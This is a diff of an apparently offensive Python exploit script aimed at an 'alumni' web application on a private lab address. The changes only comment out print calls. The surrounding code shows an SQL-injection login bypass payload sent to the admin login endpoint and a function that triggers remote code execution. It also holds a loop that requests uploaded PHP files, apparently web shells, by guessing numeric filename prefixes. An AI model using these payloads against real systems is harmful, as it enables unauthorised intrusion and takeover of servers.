@@ -6,7 +6,7 @@ def sqli_admin():
 	data = {"username":"admin' or 1=1#","password":"hacked"}
 	adminlogin = "http://10.0.2.13/alumni/admin/ajax.php?action=login"
 	s.post(adminlogin,data=data)
-	print(s.cookies)
+	#print(s.cookies)
 	return s
 
 def trigger_rce(session):
@@ -25,7 +25,7 @@ def trigger_rce(session):
 
 def get_shell(start,end,session):
 	for i in range(start,end):
-		print(i)
+		#print(i)
 		session.get("http://10.0.2.13/alumni/admin/assets/uploads/"+str(i)+"_yunaranyancat.php")
 
 def main():
